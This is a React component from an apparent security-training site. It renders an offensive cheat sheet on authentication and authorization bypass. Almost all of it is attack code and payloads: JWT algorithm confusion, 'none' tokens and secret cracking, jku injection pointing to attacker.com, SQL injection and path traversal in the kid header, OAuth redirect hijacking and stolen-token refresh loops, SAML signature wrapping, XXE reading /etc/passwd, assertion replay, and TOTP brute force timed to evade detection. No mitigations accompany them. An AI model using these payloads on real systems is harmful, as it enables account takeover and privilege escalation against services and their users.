
import React from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Badge } from '@/components/ui/badge';
import { Key } from 'lucide-react';

const AuthenticationBypass: React.FC = () => {
  return (
    <Card className="bg-cybr-card border-cybr-muted">
      <CardHeader>
        <div className="flex items-center gap-2">
          <Key className="h-6 w-6 text-cybr-primary" />
          <CardTitle className="text-cybr-primary">Authentication & Authorization Bypass</CardTitle>
        </div>
      </CardHeader>
      <CardContent className="space-y-6">
        {/* JWT Advanced Attacks */}
        <div className="space-y-4">
          <h4 className="text-lg font-semibold text-cybr-accent">JWT Advanced Attack Techniques</h4>
          
          <div className="bg-cybr-muted/20 p-4 rounded-lg">
            <h5 className="font-semibold mb-3 text-cybr-primary">Algorithm Confusion & Key Manipulation</h5>
            <p className="text-sm mb-3 opacity-80">
              Exploiting JWT implementation flaws through algorithm confusion and key manipulation.
            </p>
            <pre className="bg-black/50 p-3 rounded text-sm text-green-400 overflow-x-auto">
{`# Algorithm confusion attack (RS256 to HS256)
# Original JWT signed with RS256 (public/private key)
# Attack: Change algorithm to HS256 (symmetric key) using public key

import jwt
import base64

# Extract public key from certificate
public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
-----END PUBLIC KEY-----"""

# Create malicious payload
payload = {
    "sub": "admin",
    "role": "administrator", 
    "exp": 9999999999
}

# Sign with HS256 using public key as secret
malicious_token = jwt.encode(payload, public_key, algorithm='HS256')

# None algorithm attack
header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "admin", "role": "admin", "exp": 9999999999}

# Create token without signature
none_token = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=').decode() + '.' + \
             base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode() + '.'

# Key confusion with embedded key
header_with_key = {
    "alg": "HS256",
    "typ": "JWT",
    "jwk": {
        "kty": "oct",
        "k": base64.urlsafe_b64encode(b"attacker_controlled_key").decode()
    }
}

# Weak key brute force
import hashlib
common_secrets = ["secret", "key", "password", "123456", "jwt_secret"]

def crack_jwt(token):
    for secret in common_secrets:
        try:
            decoded = jwt.decode(token, secret, algorithms=['HS256'])
            return secret, decoded
        except:
            continue
    return None, None

# JWT header injection
# If JWT library processes header claims
malicious_header = {
    "alg": "HS256",
    "typ": "JWT", 
    "admin": True,  # Injected claim in header
    "role": "administrator"
}`}
            </pre>
          </div>

          <div className="bg-cybr-muted/20 p-4 rounded-lg">
            <h5 className="font-semibold mb-3 text-cybr-primary">JWK Set Manipulation</h5>
            <pre className="bg-black/50 p-3 rounded text-sm text-green-400 overflow-x-auto">
{`# JWK injection attack
# Step 1: Generate our own key pair
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
import json

# Generate RSA key pair
private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
public_key = private_key.public_key()

# Convert to JWK format
def rsa_key_to_jwk(key):
    numbers = key.public_numbers()
    return {
        "kty": "RSA",
        "use": "sig",
        "alg": "RS256",
        "n": base64.urlsafe_b64encode(numbers.n.to_bytes((numbers.n.bit_length() + 7) // 8, 'big')).decode().rstrip('='),
        "e": base64.urlsafe_b64encode(numbers.e.to_bytes((numbers.e.bit_length() + 7) // 8, 'big')).decode().rstrip('=')
    }

# Step 2: Host malicious JWK set
malicious_jwks = {
    "keys": [rsa_key_to_jwk(public_key)]
}

# Step 3: Create JWT with jku header pointing to our JWK set
header = {
    "alg": "RS256",
    "typ": "JWT",
    "jku": "https://attacker.com/.well-known/jwks.json"  # Our controlled endpoint
}

payload = {
    "sub": "admin",
    "role": "administrator",
    "exp": 9999999999
}

# Sign with our private key
malicious_token = jwt.encode(payload, private_key, algorithm='RS256', headers=header)

# JWK kid (Key ID) manipulation
# If server loads key based on kid parameter
header_kid_injection = {
    "alg": "HS256",
    "typ": "JWT",
    "kid": "/dev/null"  # Try to load null/empty key
}

# Or SQL injection in kid parameter
header_sqli = {
    "alg": "HS256", 
    "typ": "JWT",
    "kid": "1' UNION SELECT 'secret' as key_value--"
}

# Path traversal in kid
header_traversal = {
    "alg": "HS256",
    "typ": "JWT", 
    "kid": "../../../../../../etc/passwd"
}`}
            </pre>
          </div>
        </div>

        {/* OAuth 2.0/OIDC Exploitation */}
        <div className="space-y-4">
          <h4 className="text-lg font-semibold text-cybr-accent">OAuth 2.0 & OpenID Connect Attacks</h4>
          
          <div className="bg-cybr-muted/20 p-4 rounded-lg">
            <h5 className="font-semibold mb-3 text-cybr-primary">Authorization Code Flow Manipulation</h5>
            <pre className="bg-black/50 p-3 rounded text-sm text-green-400 overflow-x-auto">
{`# State parameter bypass/manipulation
# Legitimate OAuth request:
https://oauth.provider.com/authorize?
    client_id=12345&
    redirect_uri=https://client.com/callback&
    state=random_csrf_token&
    response_type=code

# Attack 1: Missing state validation
# Remove state parameter entirely
https://oauth.provider.com/authorize?
    client_id=12345&
    redirect_uri=https://client.com/callback&
    response_type=code

# Attack 2: State prediction/fixation  
# Use predictable state values
https://oauth.provider.com/authorize?
    client_id=12345&
    redirect_uri=https://client.com/callback&
    state=1&
    response_type=code

# Redirect URI manipulation
# Attack 1: Open redirect via path traversal
redirect_uri=https://client.com/callback/../redirect?url=https://attacker.com

# Attack 2: Subdomain confusion
redirect_uri=https://evil.client.com/callback

# Attack 3: Weak redirect validation
redirect_uri=https://client.com.attacker.com/callback

# Attack 4: Fragment identifier (#) bypass
redirect_uri=https://client.com/callback#https://attacker.com

# PKCE bypass (Proof Key for Code Exchange)
# If PKCE is not enforced or implementation is weak

# Step 1: Start OAuth flow without PKCE
import requests
import base64
import hashlib
import secrets

# Normal PKCE flow
code_verifier = base64.urlsafe_b64encode(secrets.token_bytes(32)).decode('utf-8').rstrip('=')
code_challenge = base64.urlsafe_b64encode(hashlib.sha256(code_verifier.encode()).digest()).decode('utf-8').rstrip('=')

# Attack: Try without code_challenge
auth_url = f"https://oauth.provider.com/authorize?client_id=12345&redirect_uri=https://client.com/callback&response_type=code"

# Or use weak/predictable code_verifier
weak_verifier = "a" * 43  # Minimum length but predictable`}
            </pre>
          </div>

          <div className="bg-cybr-muted/20 p-4 rounded-lg">
            <h5 className="font-semibold mb-3 text-cybr-primary">Token Manipulation & Replay Attacks</h5>
            <pre className="bg-black/50 p-3 rounded text-sm text-green-400 overflow-x-auto">
{`# Access token manipulation
# If access tokens are JWTs, apply JWT attacks
# If opaque tokens, try:

# Token replay across different endpoints
curl -H "Authorization: Bearer stolen_token" https://api.example.com/admin/users
curl -H "Authorization: Bearer stolen_token" https://api.example.com/v2/admin/users  
curl -H "Authorization: Bearer stolen_token" https://admin.example.com/api/users

# Refresh token abuse
# Step 1: Steal refresh token (longer lived)
# Step 2: Generate new access tokens indefinitely

import requests

refresh_token = "stolen_refresh_token"
client_id = "known_client_id"

while True:
    response = requests.post("https://oauth.provider.com/token", data={
        "grant_type": "refresh_token",
        "refresh_token": refresh_token,
        "client_id": client_id
    })
    
    if response.status_code == 200:
        tokens = response.json()
        new_access_token = tokens["access_token"]
        
        # Use new access token for API calls
        api_response = requests.get("https://api.example.com/sensitive", 
                                  headers={"Authorization": f"Bearer {new_access_token}"})
        print(api_response.text)
    
    time.sleep(60)  # Wait before next refresh

# Scope escalation
# Request broader scopes than originally granted
token_request = {
    "grant_type": "authorization_code",
    "code": "auth_code",
    "redirect_uri": "https://client.com/callback",
    "client_id": "12345",
    "scope": "read write admin delete"  # Escalated scopes
}

# Client impersonation
# Use legitimate client credentials with malicious redirect
auth_url = f"https://oauth.provider.com/authorize?client_id=legitimate_client&redirect_uri=https://attacker.com/callback&response_type=code&scope=admin"`}
            </pre>
          </div>
        </div>

        {/* SAML Attacks */}
        <div className="space-y-4">
          <h4 className="text-lg font-semibold text-cybr-accent">SAML Security Exploitation</h4>
          
          <div className="bg-cybr-muted/20 p-4 rounded-lg">
            <h5 className="font-semibold mb-3 text-cybr-primary">XML Signature Wrapping & Assertion Manipulation</h5>
            <pre className="bg-black/50 p-3 rounded text-sm text-green-400 overflow-x-auto">
{`<!-- XML Signature Wrapping Attack -->
<!-- Original signed assertion -->
<saml:Assertion ID="original_assertion">
  <saml:Subject>
    <saml:NameID>victim@company.com</saml:NameID>
  </saml:Subject>
  <saml:AttributeStatement>
    <saml:Attribute Name="role">
      <saml:AttributeValue>user</saml:AttributeValue>
    </saml:Attribute>
  </saml:AttributeStatement>
  <ds:Signature>
    <!-- Valid signature for above assertion -->
  </ds:Signature>
</saml:Assertion>

<!-- Wrapped attack - insert malicious assertion before signed one -->
<saml:Response>
  <!-- Malicious assertion (not signed) -->
  <saml:Assertion ID="malicious_assertion">
    <saml:Subject>
      <saml:NameID>victim@company.com</saml:NameID>
    </saml:Subject>
    <saml:AttributeStatement>
      <saml:Attribute Name="role">
        <saml:AttributeValue>admin</saml:AttributeValue>  <!-- Escalated role -->
      </saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
  
  <!-- Original signed assertion -->
  <saml:Assertion ID="original_assertion">
    <saml:Subject>
      <saml:NameID>victim@company.com</saml:NameID>
    </saml:Subject>
    <saml:AttributeStatement>
      <saml:Attribute Name="role">
        <saml:AttributeValue>user</saml:AttributeValue>
      </saml:Attribute>
    </saml:AttributeStatement>
    <ds:Signature>
      <!-- Valid signature - validates successfully -->
    </ds:Signature>
  </saml:Assertion>
</saml:Response>

<!-- Comment injection attack -->
<saml:Assertion ID="assertion123">
  <saml:Subject>
    <saml:NameID>admin@company.com<!-- -->victim@company.com</saml:NameID>
  </saml:Subject>
</saml:Assertion>

<!-- XXE in SAML -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE saml:Response [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<saml:Response>
  <saml:Status>
    <saml:StatusCode Value="&xxe;"/>
  </saml:Status>
</saml:Response>`}
            </pre>
          </div>

          <div className="bg-cybr-muted/20 p-4 rounded-lg">
            <h5 className="font-semibold mb-3 text-cybr-primary">SAML Assertion Replay & Timing Attacks</h5>
            <pre className="bg-black/50 p-3 rounded text-sm text-green-400 overflow-x-auto">
{`# SAML assertion replay attack
import requests
import time
from datetime import datetime, timedelta

# Capture legitimate SAML response
saml_response = """base64_encoded_saml_assertion"""

# Replay attack - use same assertion multiple times
for i in range(100):
    response = requests.post("https://sp.company.com/acs", data={
        "SAMLResponse": saml_response,
        "RelayState": f"target_page_{i}"
    })
    print(f"Replay {i}: {response.status_code}")

# Timing manipulation
# Modify NotBefore/NotOnOrAfter conditions
# Create assertion valid for extended time period

# Python SAML manipulation example
from lxml import etree
import base64

def modify_saml_timing(saml_b64):
    # Decode SAML
    saml_xml = base64.b64decode(saml_b64)
    root = etree.fromstring(saml_xml)
    
    # Find conditions element
    conditions = root.find('.//{urn:oasis:names:tc:SAML:2.0:assertion}Conditions')
    
    # Extend validity period
    not_before = datetime.now() - timedelta(hours=1)
    not_after = datetime.now() + timedelta(days=365)
    
    conditions.set('NotBefore', not_before.isoformat() + 'Z')
    conditions.set('NotOnOrAfter', not_after.isoformat() + 'Z')
    
    # Re-encode
    return base64.b64encode(etree.tostring(root)).decode()

# Audience restriction bypass
# Remove or modify audience restrictions
def remove_audience_restriction(saml_b64):
    saml_xml = base64.b64decode(saml_b64)
    root = etree.fromstring(saml_xml)
    
    # Find and remove audience restriction
    audience_restriction = root.find('.//{urn:oasis:names:tc:SAML:2.0:assertion}AudienceRestriction')
    if audience_restriction is not None:
        audience_restriction.getparent().remove(audience_restriction)
    
    return base64.b64encode(etree.tostring(root)).decode()`}
            </pre>
          </div>
        </div>

        {/* Multi-Factor Authentication Bypasses */}
        <div className="space-y-4">
          <h4 className="text-lg font-semibold text-cybr-accent">Multi-Factor Authentication Bypass</h4>
          
          <div className="bg-cybr-muted/20 p-4 rounded-lg">
            <h5 className="font-semibold mb-3 text-cybr-primary">TOTP & SMS Bypass Techniques</h5>
            <pre className="bg-black/50 p-3 rounded text-sm text-green-400 overflow-x-auto">
{`# TOTP brute force (if rate limiting is weak)
import requests
import time
from itertools import product

def brute_force_totp(session, username, password):
    # Try all possible 6-digit codes
    for code in range(000000, 999999):
        totp_code = f"{code:06d}"
        
        response = session.post("/login/2fa", data={
            "username": username,
            "password": password, 
            "totp": totp_code
        })
        
        if "success" in response.text.lower():
            return totp_code
            
        # Add delay to avoid detection
        time.sleep(0.1)
    
    return None

# Backup code enumeration
backup_codes = [
    "12345678", "87654321", "11111111", "00000000",
    "abcd1234", "1234abcd", "aaaaaaaa", "12341234"
]

for code in backup_codes:
    response = requests.post("/login/backup", data={
        "username": "admin",
        "backup_code": code
    })

# Response manipulation
# Intercept 2FA verification response and modify
# Original response: {"success": false, "message": "Invalid code"}
# Modified response: {"success": true, "message": "Valid code"}

# Race condition in 2FA
# Send multiple 2FA attempts simultaneously
import threading

def attempt_2fa(code):
    response = requests.post("/verify-2fa", data={"code": code})
    if response.status_code == 200:
        print(f"Success with code: {code}")

# Try multiple codes at once
codes = ["123456", "654321", "111111", "000000"]
threads = []

for code in codes:
    thread = threading.Thread(target=attempt_2fa, args=(code,))
    threads.append(thread)
    thread.start()

# Password reset 2FA bypass
# Step 1: Initiate password reset
requests.post("/forgot-password", data={"email": "victim@company.com"})

# Step 2: Try to bypass 2FA in reset flow
reset_response = requests.post("/reset-password", data={
    "token": "reset_token_from_email",
    "password": "new_password",
    "skip_2fa": "true"  # Try various bypass parameters
})

# Session fixation after partial authentication
# If session persists after first factor but before 2FA
session_after_1fa = requests.Session()
response = session_after_1fa.post("/login", data={
    "username": "admin", 
    "password": "correct_password"
})

# Try accessing protected resources before completing 2FA
protected_response = session_after_1fa.get("/admin/dashboard")
if protected_response.status_code == 200:
    print("2FA bypass successful!")`}
            </pre>
          </div>
        </div>
      </CardContent>
    </Card>
  );
};

export default AuthenticationBypass;
